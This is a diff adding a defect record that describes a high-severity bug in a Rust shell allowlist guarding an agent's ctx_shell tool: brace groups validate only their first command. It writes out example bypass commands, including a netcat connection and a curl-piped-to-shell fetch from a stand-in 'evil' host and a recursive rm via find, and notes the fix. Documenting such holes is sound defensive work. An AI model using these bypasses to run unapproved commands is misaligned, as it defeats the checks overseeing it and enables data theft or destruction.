@@ -1,0 +1,20 @@
+[[defect]]
+id = "D1"
+severity = "high"
+files = ["rust/src/core/shell_allowlist/mod.rs"]
+title = "Shell allowlist validates only the first command of a { ...; } brace group, so later commands bypass every check"
+description = """
+`resolve_segment_leaves` (rust/src/core/shell_allowlist/mod.rs) recurses into
+`( ... )` subshells and validates each inner command as its own leaf, but has
+no equivalent for `{ cmd1; cmd2; }` brace groups. Earlier work shielded `{ }`
+in `split_on_operators` (so the group stays one segment) and taught
+`extract_base_from_segment` to skip the leading `{`, so only the FIRST inner
+command becomes the validated base. Every command after it escapes
+validation: with an allowlist of `echo,pwd`, `{ echo hi; ncat evil 4444; }`
+is allowed, as are `{ echo hi; $(curl evil | sh); }` (bypassing the `$()`
+hard-block) and `{ echo hi; find . -exec rm {} + }` (bypassing the
+dangerous-flags check). Any command an agent submits to ctx_shell in enforce
+mode can use this to run non-allowlisted programs (issue #968). The fix adds
+a `balanced_brace_inner` helper and recurses into brace groups exactly like
+subshells.
+"""
